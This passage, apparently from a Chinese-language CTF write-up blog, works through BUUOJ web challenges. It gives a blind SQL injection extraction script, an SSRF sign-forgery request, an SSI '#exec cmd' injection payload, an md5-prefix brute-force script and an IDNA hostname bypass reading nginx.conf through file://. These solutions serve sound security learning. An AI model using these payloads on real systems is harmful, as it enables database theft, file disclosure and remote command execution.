&quot;0^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())),&quot;+str(x)+&quot;,1))&gt;&quot;+str(mid)+&quot;)&quot;</span><br><span class="line">            &#125;</span><br><span class="line">            r &#x3D; requests.get(url&#x3D;url, params&#x3D;params)</span><br><span class="line">            if &quot;others~~~&quot; in r.text:</span><br><span class="line">                left &#x3D; mid + 1</span><br><span class="line">            else:</span><br><span class="line">                right &#x3D; mid</span><br><span class="line">            mid &#x3D; (left + right) &#x2F;&#x2F; 2</span><br><span class="line">        if left &lt; 32 or right &gt; 127:</span><br><span class="line">            break</span><br><span class="line">        tables_name +&#x3D; chr(mid)</span><br><span class="line">        print(&quot;table:&quot;, tables_name)</span><br><span class="line">        time.sleep(1)</span><br><span class="line">#  F1naI1y,Flaaaaag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getColmun():</span><br><span class="line">    column_name &#x3D; &quot;&quot;</span><br><span class="line">    for x in range(1, 1000):</span><br><span class="line">        left &#x3D; 32</span><br><span class="line">        right &#x3D; 127</span><br><span class="line">        mid &#x3D; (left+right)&#x2F;&#x2F;2</span><br><span class="line">        while left &lt; right:</span><br><span class="line">            while left &lt; right:</span><br><span class="line">                params &#x3D; &#123;</span><br><span class="line">                    &quot;id&quot;: &quot;0^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;Flaaaaag&#39;)),&quot; + str(x) + &quot;,1))&gt;&quot; + str(mid) + &quot;)&quot;</span><br><span class="line">                &#125;</span><br><span class="line">                r &#x3D; requests.get(url&#x3D;url, params&#x3D;params)</span><br><span class="line">                if &quot;others~~~&quot; in r.text:</span><br><span class="line">                    left &#x3D; mid + 1</span><br><span class="line">                else:</span><br><span class="line">                    right &#x3D; mid</span><br><span class="line">                mid &#x3D; (left + right) &#x2F;&#x2F; 2</span><br><span class="line">            if left &lt; 32 or right &gt; 127:</span><br><span class="line">                break</span><br><span class="line">            column_name +&#x3D; chr(mid)</span><br><span class="line">            print(&quot;column:&quot;,  column_name)</span><br><span class="line">            time.sleep(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getFlag():</span><br><span class="line">    flag &#x3D; &quot;&quot;</span><br><span class="line">    for x in range(1, 1000):</span><br><span class="line">        left &#x3D; 32</span><br><span class="line">        right &#x3D; 127</span><br><span class="line">        mid &#x3D; (left+right)&#x2F;&#x2F;2</span><br><span class="line">        while left &lt; right:</span><br><span class="line">            while left &lt; right:</span><br><span class="line">                params &#x3D; &#123;</span><br><span class="line">                    &quot;id&quot;: &quot;0^(ord(substr((select(group_concat(password))from(F1naI1y)),&quot; + str(x) + &quot;,1))&gt;&quot; + str(mid) + &quot;)&quot;</span><br><span class="line">                &#125;</span><br><span class="line">                r &#x3D; requests.get(url&#x3D;url, params&#x3D;params)</span><br><span class="line">                if &quot;others~~~&quot; in r.text:</span><br><span class="line">                    left &#x3D; mid + 1</span><br><span class="line">                else:</span><br><span class="line">                    right &#x3D; mid</span><br><span class="line">                mid &#x3D; (left + right) &#x2F;&#x2F; 2</span><br><span class="line">            if left &lt; 32 or right &gt; 127:</span><br><span class="line">                break</span><br><span class="line">            flag +&#x3D; chr(mid)</span><br><span class="line">            print(&quot;flag:&quot;,  flag)</span><br><span class="line">            time.sleep(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># getDatabase()</span><br><span class="line"># getTable()</span><br><span class="line"># getColmun()</span><br><span class="line">getFlag()</span><br></pre></td></tr></table></figure>

<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># #encoding&#x3D;utf-8</span><br><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import urllib</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&#39;latin1&#39;)</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key &#x3D; os.urandom(16)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Task:</span><br><span class="line">    def __init__(self, action, param, sign, ip):  # 是一个简单的赋值函数</span><br><span class="line">        self.action &#x3D; action</span><br><span class="line">        self.param &#x3D; param</span><br><span class="line">        self.sign &#x3D; sign</span><br><span class="line">        self.sandbox &#x3D; md5(ip)</span><br><span class="line">        if(not os.path.exists(self.sandbox)):  # 如果没有该文件夹，则创立一个文件夹</span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    def Exec(self):</span><br><span class="line">        result &#x3D; &#123;&#125;</span><br><span class="line">        result[&#39;code&#39;] &#x3D; 500</span><br><span class="line">        if (self.checkSign()):</span><br><span class="line">            if &quot;scan&quot; in self.action:</span><br><span class="line">                tmpfile &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox,</span><br><span class="line">                               &#39;w&#39;)  # 注意w，可以对result.txt文件进行修改</span><br><span class="line">                resp &#x3D; scan(self.param)</span><br><span class="line">                if (resp &#x3D;&#x3D; &quot;Connection Timeout&quot;):</span><br><span class="line">                    result[&#39;data&#39;] &#x3D; resp</span><br><span class="line">                else:</span><br><span class="line">                    print resp</span><br><span class="line">                    # 这个将resp中的数据写入result.txt中，可以利用为将flag.txt中的数据放进result.txt中</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[&#39;code&#39;] &#x3D; 200</span><br><span class="line">            if &quot;read&quot; in self.action:</span><br><span class="line">                f &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;r&#39;)  # 打开方式为只读</span><br><span class="line">                result[&#39;code&#39;] &#x3D; 200</span><br><span class="line">                result[&#39;data&#39;] &#x3D; f.read()  # 读取result.txt中的数据</span><br><span class="line">            if result[&#39;code&#39;] &#x3D;&#x3D; 500:</span><br><span class="line">                result[&#39;data&#39;] &#x3D; &quot;Action Error&quot;</span><br><span class="line">        else:</span><br><span class="line">            result[&#39;code&#39;] &#x3D; 500</span><br><span class="line">            result[&#39;msg&#39;] &#x3D; &quot;Sign Error&quot;</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def checkSign(self):</span><br><span class="line">        if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign):</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;&#x2F;geneSign&quot;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">def geneSign():</span><br><span class="line">    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action &#x3D; &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 注意这个绑定，接下来的几个函数都很重要，这个相当于c语言里面的主函数，接下来是调用其他函数的过程</span><br><span class="line">@app.route(&#39;&#x2F;De1ta&#39;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">def challenge():</span><br><span class="line">    action &#x3D; urllib.unquote(request.cookies.get(</span><br><span class="line">        &quot;action&quot;))  # cookie传递action参数，对应不同的处理方式</span><br><span class="line">    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))  # 传递get方式的参数param</span><br><span class="line">    sign &#x3D; urllib.unquote(request.cookies.get(&quot;sign&quot;))  # cookie传递sign参数sign</span><br><span class="line">    ip &#x3D; request.remote_addr  # 获取请求端的ip地址</span><br><span class="line">    if(waf(param)):  # 调用waf函数进行过滤</span><br><span class="line">        return &quot;No Hacker!!!!&quot;</span><br><span class="line">    task &#x3D; Task(action, param, sign, ip)  # 创建Task类对象</span><br><span class="line">    return json.dumps(task.Exec())  # 以json的形式返回到客户端</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def index():</span><br><span class="line">    return open(&quot;code.txt&quot;, &quot;r&quot;).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def scan(param):</span><br><span class="line">    socket.setdefaulttimeout(1)</span><br><span class="line">    try:</span><br><span class="line">        # 这个可以利用为访问flag.txt。读取然后为下一步将flag.txt文件中的东西放到result.txt中做铺垫</span><br><span class="line">        return urllib.urlopen(param).read()[:50]</span><br><span class="line">    except:</span><br><span class="line">        return &quot;Connection Timeout&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getSign(action, param):  # getSign的作用是拼接secret_key,param,action，然后返回拼接后的字符串的md5加密值</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def md5(content):  # 将传入的字符串进行md5加密</span><br><span class="line">    return hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def waf(param):  # 防火墙的作用是判断开头的几个字母是否是gopher 或者是file  如果是的话，返回true</span><br><span class="line">    check &#x3D; param.strip().lower()</span><br><span class="line">    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.debug &#x3D; False</span><br><span class="line">    app.run(host&#x3D;&#39;0.0.0.0&#39;, port&#x3D;9999)</span><br></pre></td></tr></table></figure>

<p>提示是SSRF，那应该是直接读取文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">def Exec(self):</span><br><span class="line">     result &#x3D; &#123;&#125;</span><br><span class="line">     result[&#39;code&#39;] &#x3D; 500</span><br><span class="line">     if (self.checkSign()):</span><br><span class="line">         if &quot;scan&quot; in self.action:</span><br><span class="line">             tmpfile &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox,</span><br><span class="line">                            &#39;w&#39;)  # 注意w，可以对result.txt文件进行修改</span><br><span class="line">             resp &#x3D; scan(self.param)</span><br><span class="line">             if (resp &#x3D;&#x3D; &quot;Connection Timeout&quot;):</span><br><span class="line">                 result[&#39;data&#39;] &#x3D; resp</span><br><span class="line">             else:</span><br><span class="line">                 print resp</span><br><span class="line">                 # 这个将resp中的数据写入result.txt中，可以利用为将flag.txt中的数据放进result.txt中</span><br><span class="line">                 tmpfile.write(resp)</span><br><span class="line">                 tmpfile.close()</span><br><span class="line">             result[&#39;code&#39;] &#x3D; 200</span><br><span class="line">         if &quot;read&quot; in self.action:</span><br><span class="line">             f &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;r&#39;)  # 打开方式为只读</span><br><span class="line">             result[&#39;code&#39;] &#x3D; 200</span><br><span class="line">             result[&#39;data&#39;] &#x3D; f.read()  # 读取result.txt中的数据</span><br><span class="line">         if result[&#39;code&#39;] &#x3D;&#x3D; 500:</span><br><span class="line">             result[&#39;data&#39;] &#x3D; &quot;Action Error&quot;</span><br><span class="line">     else:</span><br><span class="line">         result[&#39;code&#39;] &#x3D; 500</span><br><span class="line">         result[&#39;msg&#39;] &#x3D; &quot;Sign Error&quot;</span><br><span class="line">     return result</span><br></pre></td></tr></table></figure>

<p>发现read里面可以直接f.read，并且文件由sandbox控制</p>
<p>而scan中可以进行写入操作，那么我们只需要进入这个里面并且触发两个函数即可</p>
<p>那么我们此时就需要绕过判断</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if (self.checkSign()):</span><br><span class="line">那么就需要返回真</span><br><span class="line">if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign):</span><br><span class="line"></span><br><span class="line">def geneSign():</span><br><span class="line">    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action &#x3D; &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line">这里需要注意默认的action是scan</span><br><span class="line"></span><br><span class="line">def getSign(action, param):  # getSign的作用是拼接secret_key,param,action，然后返回拼接后的字符串的md5加密值</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>

<p>那么最如果我们什么都不填的话返回</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">secert_key + action</span><br><span class="line">我们需要利用</span><br><span class="line">param传入flag.txt进行打开写入操作</span><br><span class="line">并且action必须包含scan和read</span><br><span class="line">那么我们最好需要的到的md5需要是</span><br><span class="line">secert_key + flag.txtread + scan</span><br><span class="line">因此我们需要先传入flag.txtread查看回显，传入相应的sign</span><br></pre></td></tr></table></figure>

<p>进入路由geneSign</p>


<p>进入Delta路由</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;De1ta?param&#x3D;flag.txt HTTP&#x2F;1.1</span><br><span class="line">Host: a863c7ee-c9f7-4dda-a16e-c09eeddaaed6.node4.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko&#x2F;20100101 Firefox&#x2F;108.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cookie: action&#x3D;readscan;sign&#x3D;3856f9d6c86b77cb0c0b683587ba3dd3</span><br></pre></td></tr></table></figure>



<h3 id="TIPS-7"><a href="#TIPS-7" class="headerlink" title="TIPS"></a>TIPS</h3><p>对于md5的加密检测</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">参考哈希长度拓展攻击</span><br><span class="line">https:&#x2F;&#x2F;joychou.org&#x2F;web&#x2F;hash-length-extension-attack.html#directory092413593576057416</span><br><span class="line">利用工具Hashdump</span><br></pre></td></tr></table></figure>

<h2 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h2><p>这题告诉我如果没有信息先F12</p>
<h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2>

<p>这题目有点拉</p>
<h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>一顿测试什么都没有，目录扫描下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http:&#x2F;&#x2F;34b56be3-014c-4638-a5ab-9bd0473f7a3e.node4.buuoj.cn:81 --timeout&#x3D;2 -t 1 -x 400,403,404,500,503,429</span><br></pre></td></tr></table></figure>

<p>发现路由/index.php.swp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	ob_start();</span><br><span class="line">	function get_hash()&#123;</span><br><span class="line">		$chars &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;;</span><br><span class="line">		$random &#x3D; $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];&#x2F;&#x2F;Random 5 times</span><br><span class="line">		$content &#x3D; uniqid().$random;</span><br><span class="line">		return sha1($content); </span><br><span class="line">	&#125;</span><br><span class="line">    header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">	***</span><br><span class="line">    if(isset($_POST[&#39;username&#39;]) and $_POST[&#39;username&#39;] !&#x3D; &#39;&#39; )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin &#x3D; &#39;6d0bc1&#39;;</span><br><span class="line">        if ( $admin &#x3D;&#x3D; substr(md5($_POST[&#39;password&#39;]),0,6)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">            $file_shtml &#x3D; &quot;public&#x2F;&quot;.get_hash().&quot;.shtml&quot;;</span><br><span class="line">            $shtml &#x3D; fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">            $text &#x3D; &#39;</span><br><span class="line">            ***</span><br><span class="line">            ***</span><br><span class="line">            &lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;&#x2F;h1&gt;</span><br><span class="line">            ***</span><br><span class="line">			***&#39;;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line">			echo &quot;[!] Header  error ...&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">            </span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>需要密码的md5前六位等于特定值，写个脚本爆破下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">for i in range(100000000):</span><br><span class="line">    a &#x3D; hashlib.md5(str(i).encode(&quot;utf-8&quot;)).hexdigest()</span><br><span class="line"></span><br><span class="line">    if a[0:6] &#x3D;&#x3D; &#39;6d0bc1&#39;:</span><br><span class="line">        print(i)</span><br></pre></td></tr></table></figure>

<p>但直接登录的话什么都没有，抓包发现新东西</p>


<p>一个新的路由</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public&#x2F;838bab1b0d14a0a471a47b946d58c4a79a5f785e.shtml</span><br></pre></td></tr></table></figure>



<p>好像把我们登录的用户名打进来了，试试换个Uesrname</p>


<p>可以控制username并且这里是放入网页前端代码</p>
<h3 id="TIPS-8"><a href="#TIPS-8" class="headerlink" title="TIPS"></a>TIPS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SSI注入漏洞</span><br><span class="line">SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。</span><br><span class="line"></span><br><span class="line">SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。</span><br><span class="line"></span><br><span class="line">从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。</span><br><span class="line">参考</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_40657585&#x2F;article&#x2F;details&#x2F;84260844</span><br><span class="line">&lt;!--#exec cmd&#x3D;&quot;ls -al&quot;--&gt;</span><br></pre></td></tr></table></figure>

<p>最好的payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;&lt;!--#exec cmd&#x3D;&quot;cat ..&#x2F;flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;&amp;password&#x3D;2020666</span><br></pre></td></tr></table></figure>

<h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p>给了源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;getUrl&#39;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">def getUrl():</span><br><span class="line">    url &#x3D; request.args.get(&quot;url&quot;)</span><br><span class="line">    host &#x3D; parse.urlparse(url).hostname</span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">        return &quot;我扌 your problem? 111&quot;</span><br><span class="line">    parts &#x3D; list(urlsplit(url))</span><br><span class="line">    host &#x3D; parts[1]</span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">        return &quot;我扌 your problem? 222 &quot; + host</span><br><span class="line">    newhost &#x3D; []</span><br><span class="line">    for h in host.split(&#39;.&#39;):</span><br><span class="line">        newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</span><br><span class="line">    parts[1] &#x3D; &#39;.&#39;.join(newhost)</span><br><span class="line">    #去掉 url 中的空格</span><br><span class="line">    finalUrl &#x3D; urlunsplit(parts).split(&#39; &#39;)[0]</span><br><span class="line">    host &#x3D; parse.urlparse(finalUrl).hostname</span><br><span class="line">    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:</span><br><span class="line">        return urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    else:</span><br><span class="line">        return &quot;我扌 your problem? 333&quot;</span><br></pre></td></tr></table></figure>

<p>需要绕过两次判断才能进行读文件，并且这三次判断的内容是一样的，那么就需要我们的转化，那么我们就需要在第三次判断的时候能够有符合条件的内容，并且看到第三次进行urlunsolit，前面会进行一次对于h即host的转化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for h in host.split(&#39;.&#39;):</span><br><span class="line">        newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</span><br></pre></td></tr></table></figure>

<p>那么我们是否能够对此进行反向推行，我们先进行加密，如何经过这里解密，那么此时判断条件生效</p>
<p>脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">for i in range(128, 65537):</span><br><span class="line">    tmp &#x3D; chr(i)</span><br><span class="line">    try:</span><br><span class="line">        res &#x3D; tmp.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;)</span><br><span class="line">        if(&quot;-&quot;) in res and len(res) !&#x3D; 1:</span><br><span class="line">            continue</span><br><span class="line">            # print(res)</span><br><span class="line">        print(&quot;U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; &quot;.format(tmp, res, i))</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;fd135a5b-5e96-49ec-a3ec-962516cec4b2.node4.buuoj.cn:81&#x2F;getUrl?url&#x3D;file:&#x2F;&#x2F;suctf.cⒸ&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br><span class="line">这里注意这个特殊符号需要变成url编码</span><br></pre></td></tr></table></figure>

<h3 id="TIPS-9"><a href="#TIPS-9" class="headerlink" title="TIPS"></a>TIPS</h3><p>nginx的配置文件所在位置</p>
